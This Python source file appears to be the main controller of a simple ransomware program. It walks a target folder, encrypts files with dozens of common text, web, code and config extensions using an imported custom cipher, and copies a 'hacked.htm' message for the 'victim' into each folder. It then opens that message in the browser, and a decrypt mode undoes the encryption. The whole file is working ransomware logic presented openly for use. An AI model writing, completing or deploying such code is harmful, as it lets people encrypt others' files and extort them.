from product_cipher import *
from functions import *
import webbrowser
from shutil import copy
import os


# Main controller that gets input from the user and a list of files
# and sends them off to be encrypted or decrypted
def main():

    # Create the key and get mode from the user
    key = createKey()
    mode = input('Select "encrypt" or "decrypt": ')

    # Specify the root directory
    path = "target_folder/"

    # File to display message to victim
    message_to_victim = "hacked.htm"

    # List of the filetypes that are supported by the program
    ext = ('.txt', '.xhtml', '.html', '.htm', '.css', '.php', '.sql',
           '.java', '.jsp', '.js', '.xml', '.xsl', '.xsd', '.xslt', '.xlog',
           '.json', '.py', '.rtf', '.srt', '.sub', '.csv', '.conf', '.log',
           '.manifest', '.lrc', '.html5', '.linux', '.sha1', '.sha512',
           '.err', '.readme', '.man', '.encrypted')

    '''
    Search the filesystem. For each file found, check if the extension is
    on the supported list. If it is, create a full filename including
    the path and pass it to either encrypt or decrypt depending on the mode.
    If encrypting, copy the message file to each folder with encrypted files.
    If decrypting, delete the message file from those folders.
    '''
    for root, subdir, files in os.walk(path):
        check = 0
        for filename in files:
            if filename.endswith(tuple(ext)):
                filename = os.path.join(root, filename)
                if mode == 'encrypt':
                    encrypt(key, mode, filename)
                    if check == 0:
                        copy(message_to_victim, root)
                        check = 1
                elif mode == 'decrypt':
                    if filename == os.path.join(root, message_to_victim):
                        os.remove(filename)
                    else:
                        decrypt(key, mode, filename)

    # When encryption is finished, open the browser and display the message.
    if mode == 'encrypt':
        webbrowser.open(message_to_victim, new=1)


main()
